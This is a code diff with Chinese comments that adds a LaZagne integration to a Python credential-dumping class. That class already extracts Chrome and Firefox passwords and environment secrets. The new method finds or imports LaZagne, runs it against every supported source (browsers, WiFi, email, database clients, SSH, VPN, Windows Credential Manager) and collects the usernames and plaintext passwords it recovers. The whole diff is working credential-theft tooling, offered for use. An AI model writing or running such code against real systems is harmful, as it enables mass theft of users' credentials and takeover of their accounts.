@@ -752,6 +752,7 @@ class CredentialDumper:
             "chrome": self.dump_chrome_passwords,
             "firefox": self.dump_firefox_passwords,
             "env": self.dump_environment_secrets,
+            "lazagne": self.dump_lazagne,
         }
 
         # 选择要执行的方法
@@ -789,6 +790,100 @@ class CredentialDumper:
             return output_path
         else:
             return json.dumps(data, indent=2, ensure_ascii=False)
+
+
+    def dump_lazagne(self) -> DumpResult:
+        """
+        LaZagne 集成 — 调用 LaZagne 进行全平台凭据提取
+
+        LaZagne 支持: 浏览器(Chrome/Firefox/Edge/Opera), WiFi, 邮件客户端,
+        数据库客户端, Git, SSH, FTP, VPN, Windows Credential Manager 等
+
+        如果 LaZagne 未安装，返回安装指引。
+        """
+        import shutil
+        import subprocess
+        import sys
+
+        result = DumpResult(source="lazagne", platform=self.os_type)
+
+        # 查找 LaZagne
+        lazagne_path = shutil.which("lazagne") or shutil.which("laZagne")
+
+        # 尝试作为 Python 模块调用
+        if not lazagne_path:
+            try:
+                import lazagne as _lz
+
+                lazagne_path = "module"
+            except ImportError:
+                pass
+
+        if not lazagne_path:
+            result.error = (
+                "LaZagne 未安装。安装方式:\n"
+                "  pip install lazagne\n"
+                "  或: git clone https://github.com/AlessandroZ/LaZagne tools/lazagne"
+            )
+            logger.warning("LaZagne 不可用: %s", result.error)
+            return result
+
+        try:
+            # 调用 LaZagne — JSON 输出
+            if lazagne_path == "module":
+                cmd = [sys.executable, "-m", "lazagne.lazagne", "all", "-oJ"]
+            else:
+                cmd = [lazagne_path, "all", "-oJ"]
+
+            proc = subprocess.run(
+                cmd,
+                capture_output=True,
+                text=True,
+                timeout=120,
+            )
+
+            if proc.returncode == 0 and proc.stdout:
+                # 解析 LaZagne JSON 输出
+                try:
+                    lazagne_results = json.loads(proc.stdout)
+                except json.JSONDecodeError:
+                    # LaZagne 有时输出非纯 JSON, 尝试提取
+                    lazagne_results = proc.stdout
+
+                # 转换为我们的凭据格式
+                if isinstance(lazagne_results, list):
+                    for entry in lazagne_results:
+                        if isinstance(entry, dict):
+                            for category, creds in entry.items():
+                                if isinstance(creds, list):
+                                    for cred in creds:
+                                        if isinstance(cred, dict) and cred.get("Password"):
+                                            self.credentials.append(
+                                                CredentialInfo(
+                                                    cred_type=CredentialType.PASSWORD,
+                                                    source=f"lazagne/{category}",
+                                                    target=cred.get("URL", cred.get("Host", "")),
+                                                    username=cred.get("Login", cred.get("Username", "")),
+                                                    password=cred.get("Password", ""),
+                                                    extra={"lazagne_category": category},
+                                                )
+                                            )
+                                            result.count += 1
+
+                result.success = True
+                self._log("LaZagne 提取完成: %d 条凭据", result.count)
+
+            elif proc.stderr:
+                result.error = proc.stderr[:500]
+                logger.warning("LaZagne 执行错误: %s", result.error)
+
+        except subprocess.TimeoutExpired:
+            result.error = "LaZagne 执行超时 (120s)"
+        except Exception as e:
+            result.error = str(e)
+            logger.error("LaZagne 调用失败: %s", e)
+
+        return result
 
 
 # 便捷函数
